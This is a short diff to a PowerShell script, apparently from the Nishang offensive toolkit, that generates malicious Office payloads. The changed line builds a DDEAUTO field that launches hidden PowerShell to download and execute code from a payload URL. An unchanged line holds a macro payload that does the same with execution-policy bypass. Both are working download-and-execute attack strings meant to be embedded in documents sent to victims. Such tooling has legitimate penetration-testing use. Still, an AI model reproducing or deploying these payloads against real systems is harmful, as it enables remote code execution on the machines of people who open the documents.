@@ -202,7 +202,7 @@ https://github.com/samratashok/nishang
     {
         #Download-Execute payload for DDE
         #https://twitter.com/SecuritySift/status/918563308541829120
-        $DDEPayload = "DDEAUTO ""C:\\Programs\\Microsoft\\Office\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -W Hidden -NoP $Wcl=new-object System.Net.WebClient;$Wcl.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;iex(New-Object Net.WebClient).DownloadString('$PayloadURL');$Arguments #"" ""data"""
+        $DDEPayload = "DDEAUTO ""C:\\Programs\\Microsoft\\Office\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -W Hidden -NoP iex(New-Object Net.WebClient).DownloadString('$PayloadURL');$Arguments #"" ""data"""
 
         #Download-Execure payload for Macro
         $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c $Wcl=new-object System.Net.WebClient;$Wcl.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IEX((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
